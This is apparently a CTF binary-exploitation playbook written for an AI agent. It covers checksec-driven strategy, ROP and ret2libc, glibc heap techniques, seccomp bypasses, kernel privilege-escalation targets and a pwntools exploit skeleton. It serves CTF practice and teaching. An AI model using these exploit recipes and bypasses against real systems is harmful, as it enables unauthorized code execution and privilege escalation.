# Skill Module: pwn (binary exploitation)

Shared, read-only playbook for one userland (or kernel) binary-exploitation target. **base.md owns the loop, submission/POISON, belief≠proof, local-build/PoW-general, per-file/function decomposition, boundaries, the notes model, and "never fabricate — measure it."** This file is pwn-specific decision tables, recipes, and tools only. The exploit lives in `solver.py`; remote `host:port` + flag path are in `../chal_desc.md`; findings go in `notes/{ANALYSIS,VULN,NEXT}.md`; cores/logs/scratch in `tmp/`.

## Toolbox
The image includes pwntools, ROPgadget, ropper, GDB, pwndbg, checksec, patchelf, binutils, seccomp-tools and QEMU user/system emulation. Check each optional command with `command -v` before use. Ruby `one_gadget`, `gef`, `ropr`, AFL++ and `pwninit` are not preinstalled; acquire only a needed extra into this job's scratch.

- **Core:** `pwntools`, `gdb`+`pwndbg`, `ROPgadget`/`ropper`, `checksec`, `patchelf`, `objdump -d -Mintel`, `strace`/`ltrace`. `seccomp-tools` can disassemble a supplied BPF filter without tracing; its `dump` command needs ptrace.
- **libc matching:** `pwninit` + `glibc-all-in-one`; ID a leaked libc at libc.rip / libc.blukat.me / libc-database `./find`; no version → pwntools `DynELF(leak, elf=elf)` resolves symbols from a leak alone.
- **Find the crash:** compile source with `-fsanitize=address,undefined` to pinpoint the overflow; or fuzz (AFL++ / libFuzzer) to a crashing input, then reason from it.
- **Kernel:** `qemu-system-x86_64 -s -S` + GDB multiarch and `cpio` are installed. `extract-vmlinux`/`vmlinux-to-elf` and gef are optional. (`one_gadget` does not apply in kernel.)

## Recon: let checksec pick the strategy
```
file ./chall
checksec --file=./chall                     # or: pwn checksec ./chall
strings -n 6 ./chall | grep -iE 'flag|/bin/sh|system|cat|token|%[dspx]'
# If seccomp is present and ptrace works: seccomp-tools dump ./chall
```
Mitigation → what it forces on you:

| checksec says | Consequence |
|---|---|
| **No canary** | a reachable stack overwrite need not preserve a canary; PIE/ASLR may still require an address leak |
| **Canary** | leak it first (fmt/OOB read/partial), or overwrite a non-canary target; a wrong canary = deterministic crash, not flakiness |
| **NX enabled** (default) | no stack shellcode → ROP / ret2libc |
| **NX disabled** | shellcode-on-stack viable if you can jump to it |
| **PIE** | every code address needs a leak; base = leak − known_offset |
| **No PIE** | `.text`/PLT/GOT fixed — read them straight from the ELF |
| **RELRO: Partial** | GOT may be writable; consider an overwrite or ret2dlresolve only if the needed primitive and resolver path are present |
| **RELRO: Full** | GOT read-only; choose a reachable writable target or return-address path, not an automatic FSOP pivot |
| **Static** | no separate dynamic libc to base from a leak; inspect the statically linked code and syscall gadgets |

Disassemble the *target function*, not the whole binary:
```
objdump -d -Mintel ./chall | less
ghidra_headless . tmpproj -import ./chall -postScript DecompileFn.java main -deleteProject
```

## Pinpoint the bug before you theorize (concrete oracle commands)
Base owns the "sanitizer/fuzz as ground-truth oracle" framing — here are the pwn commands. Source available:
```
gcc -g -fsanitize=address,undefined -fno-omit-frame-pointer chall.c -o chall.asan
./chall.asan < crash.bin                 # report names file:line + overflow direction/size
# Optional libFuzzer only if clang is installed:
# clang -g -fsanitize=address,fuzzer harness.c -o fuzz && ./fuzz -max_len=512 corpus/
# Optional AFL++ only after checking command -v afl-cc and afl-fuzz:
# afl-cc chall.c -o chall.afl && afl-fuzz -i seeds -o out -- ./chall.afl @@
```
The crash *site* is usually not the bug — walk the call stack back to the writer, in gdb:
```
gdb -q ./chall -ex run                    # feed the crashing input on stdin
bt                                        # find the frame that CORRUPTS, not the ret that faults
frame N; info locals; p &buf; p/d $rsp-(long)&buf   # measure the real overflow distance
```

## Vuln class from the input sink
Find where attacker input lands, then match it. The bug is the one call that deviates from the safe idiom.

| Sink you see | Class | Primitive it yields |
|---|---|---|
| `gets`, `read(0,buf,BIG)`, `scanf("%s")`, oversized `fread`/`memcpy` (len before check) | **Stack BOF** | overwrite saved RIP / local ptr / canary |
| `printf(user)` (no format arg) | **Format string** | `%p/%s` arbitrary read, `%n` arbitrary write; leak stack/libc/canary |
| freed chunk reused / freed twice | **UAF / double-free / tcache poison** | corrupt `fd` → malloc at arbitrary address |
| copy of len N into size-N buf writing `[N]` | **Off-by-one / null-byte** | smash `size`/`prev_size` low byte → chunk overlap |
| signed/unsigned or truncated size check | **Integer** | check passes, copy overflows; or negative index → OOB |
| index not bounds-checked | **Type confusion / OOB array** | relative or bounded arbitrary R/W |

## Primitive ladder (prove each rung by running it before the next)
1. **Offset control** — own RIP or a target pointer. Derive with a cyclic pattern, never guess:
```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall'); p.sendline(cyclic(400, n=8)); p.wait()
off = cyclic_find(p.corefile.read(p.corefile.rsp, 8), n=8)   # match the generator's n=8; verify the crash and offset
```
2. **Leak** — defeat ASLR/PIE/canary (one good leak usually unlocks the rest).
3. **AAR / AAW** — read-what-where / write-what-where.
4. **Control flow** — return addr, GOT (Partial RELRO), `__free_hook`/`__malloc_hook` (glibc ≤2.33), stack pivot, or FSOP.
5. **Shell / flag** — `system("/bin/sh")`, SROP `execve`, one_gadget, or ORW chain.

## libc: identify the exact build, then anchor every symbol
A leaked libc pointer is worthless until you know the exact build — every offset depends on it.
```
# Optional helpers only if installed for this job: pwninit, libc-database ./find, glibc-all-in-one ./download
# pwninit --bin ./chall --libc ./libc.so.6
```
Anchor everything to the identified file — never to "typical" offsets from memory:
```python
libc = ELF('./libc.so.6')
libc.address = leak - libc.sym['puts']     # leaked symbol's runtime addr
system = libc.sym['system']; binsh = next(libc.search(b'/bin/sh\x00'))
```
**No libc at all, but a repeatable leak primitive** (fmt/AAR reading N bytes at an address): resolve symbols live with `DynELF` — no version needed:
```python
d = DynELF(lambda a: leak_bytes(a), elf=elf)   # leak_bytes(addr) -> raw bytes at addr
system = d.lookup('system', 'libc')
```
If the optional `one_gadget` is installed, `one_gadget ./libc.so.6` lists single-jump `execve("/bin/sh")` gadgets. Each has a register/stack constraint (e.g. `[rsp+0x40]==NULL`). Verify it holds at call time; otherwise use installed pwntools/ROPgadget for ret2libc or ORW.

## Heap technique by glibc version — record the version in `notes/ANALYSIS.md` first
Get the version (`strings libc.so.6 | grep 'GNU C Library'` or the Ubuntu tag); it changes everything.

| glibc | What changes | Move |
|---|---|---|
| **2.26–2.28** | default tcache: up to 7 chunks/bin, `next`-linked | UAF/double-free can poison a suitable bin; later versions add checks and pointer encoding |
| **2.29+** | tcache `key` detects a repeated free in the same bin | verify whether a UAF write, alternate bin route or different primitive can bypass the check; do not assume a double-free survives |
| **2.32+** | **safe-linking**: the stored `next` is `ptr ^ (storage_address >> 12)` | Encode a target with the address of the `next` field, not an assumed heap base. The first freed entry's `next` can reveal that entry's page (`encoded_next << 12`), **not necessarily the heap base**. A second free of the same entry may still be rejected by the tcache key check; verify the actual bin state before choosing a bypass. |
| **2.34+** | `__free_hook`/`__malloc_hook` no longer provide working hook targets | re-evaluate reachable control targets and checks; FILE/exit-handler techniques are conditional, not automatic substitutes |

Version-independent staples: **unsorted bin** — a freed chunk's `fd`/`bk` points into `main_arena`, so a UAF read there is a reliable **libc leak** (unsorted-bin *attack* writes `main_arena+88` pre-2.29); **fastbin dup** — the size-field check lets you alloc near a fake size field. Named houses when tcache is poisoned/constrained: **Einherjar** (null-byte off-by-one → `prev_size`/`PREV_INUSE` → backward consolidation/overlap), **Orange** (top-chunk resize + unsorted → old-style `_IO_list_all` FSOP), **Force** (unbounded top-chunk size → alloc anywhere; pre-2.29).

### FILE/exit-handler techniques when hooks are unavailable
Only pursue a FILE path such as House of Apple 2 when the primitive can reach a relevant FILE pointer, controlled structures can be placed at known addresses, and a matching flush/call trigger is reachable. Derive `_IO_FILE`, wide-data and vtable field offsets from the **supplied libc** and prove the call path in GDB; offsets and register assumptions from another glibc build are not reusable. A `setcontext` pivot likewise needs a measured call site and the actual calling convention. For SUID targets, check whether the invoked shell preserves effective privileges; otherwise set the required IDs before launching it.

## Stack-return gotchas & no-leak returns
| Symptom / constraint | Fix |
|---|---|
| SIGSEGV at a `movaps` inside `system`/libc | stack not 16-byte aligned → prepend one extra bare `ret` gadget before the call |
| Need a clean frame to loop / re-enter | consider a call site or function entry, then verify the actual `rsp` alignment and callee setup in GDB |
| `read(0,buf,N)` return value lands in `rax` | send **exactly** N bytes so `rax=N`; a short read changes `rax` (matters when `rax` is the SROP/syscall number — e.g. `stub_execveat`=0x142) |
| Overflow too small for a full chain | **stack pivot** to a controlled buffer: `leave;ret` (set `rbp=fake-8`), `add rsp,N; ret`, or `xchg eax,esp; ret` (needs `pop rax`). Double `leave;ret` walks rsp to BSS |
| Partial RELRO and **no leak at all** | consider **ret2dlresolve** if a usable resolver/PLT entry, writable staging area and control of the call sequence are present |
| No `pop rsi`/`pop rdx` gadget | inspect for **ret2csu** gadgets in the actual binary; `__libc_csu_init` and the classic gadget pair are absent in some newer builds |
| **Forking server** (canary/PIE constant across forks) | brute the canary **byte-by-byte**: correct byte = no crash; ≤256×8 tries, no leak needed. Same trick recovers saved-RIP low bytes |

```python
# ret2dlresolve (no libc, no leak, Partial RELRO):
rop = ROP(elf)
dl  = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dl.data_addr)                 # stage the forged Rela/Sym/str into a writable page
rop.ret2dlresolve(dl)
io.sendline(flat({OFFSET: rop.chain()})); io.sendline(dl.payload)
```

## ROP quick refs
- **ret2libc** — `pop rdi; ret` → `&"/bin/sh"` → `ret` (align) → `system`. The bare `ret` fixes 16-byte alignment / `movaps` crashes.
- **ret2csu** — 3-arg calls (e.g. `execve`) when `pop rsi/rdx` gadgets are scarce; see table above.
- **SROP** — have `syscall; ret` and control of `rax`? Push a `SigreturnFrame()` to set *all* registers at once → `execve("/bin/sh",0,0)`. Ideal for tiny/static binaries.
- **ORW** (execve blocked) — chain `open`/`openat` → `read` → `write` on the exact flag path from `../chal_desc.md`.
- Gadgets: `ROPgadget --binary ./chall | grep 'pop rdi'`, `ropper`, or pwntools `ROP(elf)`:
```python
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret']))         # alignment
rop.system(binsh)
payload = flat({OFFSET: rop.chain()})
```

## seccomp: inspect the filter before choosing a syscall path
Use the supplied source or binary disassembly to establish the filter. The installed `seccomp-tools disasm filter.bpf` and `seccomp-tools emu filter.bpf <syscall>` inspect a supplied BPF policy without ptrace. `seccomp-tools dump ./chall` executes the binary under ptrace and may be denied by the container's host seccomp policy; a dump failure does not establish that the challenge has no filter. Fall back to supplied source or static disassembly. `strace` can show observed syscall failures when ptrace is permitted but does not dump the BPF policy.

| Filter blocks | Bypass |
|---|---|
| `execve` (59) only | `execveat` (322), or just ORW (`openat`+`read`+`write`) |
| exact `nr==59`, native ABI only | **x32 ABI**: `rax = 0x40000000 \| 59` — an exact-59 (64-bit) match misses the x32 invocation, which still execs |
| `open`/`openat` | Check whether `openat2` (**437**) is actually allowed, then supply a valid `open_how`. `readv`/`preadv2` only help if a descriptor for the file is already open; they cannot open a path. |
| `write` | `sendfile`, `writev`, `pwrite64` |
| arch not pinned to x86-64 | switch ABI (i386/x32) via a `retfq` to a 32-bit CS if the filter only guards `AUDIT_ARCH_X86_64` |

## Turn a compare into an oracle (kill the blind brute; ask the debugger specific questions)
When a local check gates progress (password/license/flag `memcmp`) or you need a deterministic run:
```
# LD_PRELOAD shim: make memcmp/strcmp return the match-count → recover the secret byte-by-byte
gcc -shared -fPIC preload.c -o preload.so && LD_PRELOAD=./preload.so ./chall
# freeze nondeterminism so a run is reproducible: time()->0, srand/rand fixed, getpid fixed (same shim)
# gdb: read the expected value directly instead of guessing — one SPECIFIC question at a time
gdb -q ./chall -ex 'b *cmp_site' -ex run -ex 'x/s $rsi' -ex 'p/d (int)$rax' -ex 'p $rdi'
```

## Kernel pwn primer (challenge ships `bzImage` + `rootfs.cpio` + `run.sh`)
```
# Optional extractor only if available: extract-vmlinux ./bzImage > vmlinux
zcat rootfs.cpio | cpio -idv               # edit init → root shell for local dev, then repack
# run.sh usually has -s (gdbstub :1234); add -S to pause at boot
gdb-multiarch vmlinux -ex 'target remote :1234'    # gef: kbase / ksymaddr
```
Potential escalation targets depend on the supplied kernel version, configuration, protections and reachable write/call primitive. A kernel symbol address still needs to be established when KASLR is enabled:

| Target | Win |
|---|---|
| `modprobe_path` | overwrite → `/tmp/x`; trigger by exec'ing a file with a bad magic → kernel runs your script as root |
| `core_pattern` | overwrite → `\|/tmp/x`; segfault any process → kernel pipes the core to your handler as root |
| `commit_creds(prepare_kernel_cred(0))` | call in kernel context (ROP) → current task gets root, then drop to userland shell |

Heap spray — **match the vulnerable object's `kmalloc` cache size** to the spray struct:

| Struct (cache) | Handle via | Gives |
|---|---|---|
| `seq_operations` (kmalloc-32) | `open("/proc/self/stat")` | fn-ptr set → leak / control on `read` |
| `tty_struct` (kmalloc-1024) | `open("/dev/ptmx")` | fake `ops` vtable → kROP / stack pivot |
| `msg_msg` (kmalloc-64..4096, elastic) | `msgsnd`/`msgrcv` | OOB → arbitrary read, spray |
| `user_key_payload` (variable) | `add_key` | leak / spray arbitrary bytes |
| `pipe_buffer` (allocation size varies with pipe capacity/kernel) | `pipe()` | potential `->ops` control when a matching allocation can be reclaimed |
| `setxattr` buf (kmalloc-32..1024, transient) | `setxattr()` | momentary controlled-value write (file must exist on remote) |

- **KASLR leak** then everything else; **KPTI**: return to userland via the `swapgs`/`iretq` trampoline, not a raw ret; **SMEP/SMAP**: no ret2usr — ROP fully in kernel text.
- **Cross-cache** (SLUB per-CPU free → empty slab back to buddy allocator) escapes even a dedicated `kmem_cache_create()` cache.
- **Historical `addr_limit` bypass:** only consider `KERNEL_DS`/`set_fs` on a kernel that still implements that mechanism; verify the supplied build before searching for it.
- Widen a race window: **`userfaultfd`**/**FUSE** (your handler stalls a `copy_from_user`) or **`MADV_DONTNEED`** to force a re-fault — classic for double-fetch / TOCTOU / UAF races.

## Apple-Silicon (arm64 host)
`uname -m` = arm64 → do not run x86-64 challenge binaries natively. The image ships `qemu-x86_64` (not `qemu-x86_64-static`): use `qemu-x86_64 -g 1234 ./chall` + `gdb-multiarch -ex 'target remote :1234'`. Static RE (Ghidra/angr) is arch-agnostic; use any provided remote for real dynamic behavior.

## pwntools solver skeleton — land it locally, flip one flag for remote
```python
#!/usr/bin/env python3
from pwn import *
import os, sys, hashlib, itertools

context.binary = elf = ELF('./chall')
context.log_level = 'info'                 # 'debug' to see wire bytes
libc = ELF('./libc.so.6') if os.path.exists('./libc.so.6') else None
# Do not treat elf.libc (the solver host's libc) as the remote libc.
HOST, PORT = 'REMOTE_HOST', 0              # from ../chal_desc.md
OFFSET = 0                                 # measure with cyclic; never guess

def solve_bits(prefix, nbits, alg='sha256'):     # hash(prefix+S) has >=nbits leading zero bits
    width = hashlib.new(alg).digest_size * 8
    if not 0 <= nbits <= width:
        raise ValueError('nbits exceeds digest width')
    for i in itertools.count():
        s = str(i).encode()
        if int.from_bytes(hashlib.new(alg, prefix + s).digest(), 'big') >> (width - nbits) == 0:
            return s

def handle_pow(io):                          # adapt parse to the EXACT line the server prints
    # line = io.recvline_contains(b'sha256').decode(); prefix=...; nbits=...
    # io.sendline(solve_bits(prefix.encode(), nbits))
    return io

def start():
    if args.REMOTE: return handle_pow(remote(HOST, PORT))
    if args.GDB:    return gdb.debug(elf.path, gdbscript='b *main\nc')
    return process(elf.path)

io = start()

# === leak stage ===
io.recvuntil(b'> ')
io.sendline(payload_leak)
leak_bytes = io.recvline().removesuffix(b'\n')  # only for a line-framed leak; use recvn/exact framing for raw bytes
leak = u64(leak_bytes.ljust(8, b'\x00'))
assert libc is not None, 'identify the target libc before using symbol offsets'
libc.address = leak - libc.sym['puts']
log.success('libc base = %#x', libc.address)
assert libc.address & 0xfff == 0, 'leak misaligned — parse is wrong'

# === exploit stage ===
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))          # alignment
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(flat({OFFSET: rop.chain()}))
io.interactive()                           # cat the flag from the REMOTE socket
```
`python3 solver.py` local, `... REMOTE` target when provided, `... GDB` debug. A local build may use a placeholder; verify Flag provenance from the challenge evidence (base §1/§5).

## Remote / PoW / submission
- Each `bash` call is a **fresh process** — for any stateful service write a `pwntools`/socket script, don't chain `nc` calls. For raw binaries over `nc`: `stty raw -echo`.
- For a multi-phase executor or custom VM, map preflight, authorization, planning/cache, and execution as separate trust boundaries. Record which exact bytes and state each phase binds. If those bindings differ, use a minimal control case to test the resulting hypothesis; do not assume a signature or opening is malleable. Measure the latency of an expensive legitimate operation before setting per-stage timeouts or retrying it.
- **PoW:** the `solve_bits` above handles leading-zero-*bits* gates for the specified hash; a hex-*nibble* variant checks `hexdigest().startswith('0'*n)`. Inspect the actual challenge protocol and any supplied helper before using it. If a helper is necessary, verify its source and run it in job-local scratch rather than piping an unexamined network response into a shell. Solve the PoW before proceeding with the service protocol.
- **Missing address:** if evidence from the binary or local execution proves that the real flag requires a remote service absent from `../chal_desc.md`, record the evidence and exact needed connection details in `notes/NEXT.md`, then run `request-remote "<what you need>"` once and stop this attempt. This includes a brief configured as "none" when evidence contradicts it. An unverified guess is insufficient. Re-read the brief before any later connection — the operator may add or change the address.
- Submission is human-verified: you print the flag, the operator submits (`submit-flag "CTF{...}"`). No auto-submit.

## Determinism under ASLR / flaky remote
- Prefer a **full leak** over a partial-overwrite brute — determinism beats a 1/16 guess.
- Before blaming ASLR, fix stack alignment: a `movaps` fault in `system` is deterministic and masquerades as flakiness.
- If local debugging needs deterministic addresses, use GDB's process-scoped `set disable-randomization on` where permitted; re-verify with ASLR **on** before trusting the chain remotely. Do not change the host-wide `/proc/sys/kernel/randomize_va_space` setting.
- When a real brute is unavoidable, loop it and detect the hit:
```python
for _ in range(300):
    io = start()
    try:
        # ... run chain ...
        line = io.recvline_contains(b'flag', timeout=2)
        if b'{' in line: log.success('HIT %s', line); break
    except EOFError:
        pass
    finally:
        io.close()
```

## Getting the flag out
- Shell → `cat <flagfile>` / `ls -la`; the filename is usually in `../chal_desc.md`.
- No shell (ORW/seccomp) → your chain must `open`+`read`+`write` that exact path to stdout.
- If the challenge supplies a remote service, confirm the genuine Flag on that socket before submitting. For a local-only challenge, verify against its supplied checker or artifact instead. Record the winning offset / libc-base / gadget chain in `notes/VULN.md` (the proven primitive) so a retry resumes from the last proven rung; log dead ends and POISON in `notes/NEXT.md`.
- Cross-category pivot (RE to understand the binary, crypto to break a check, web/misc for the delivery surface) → open `../../skills/<cat>.md`.
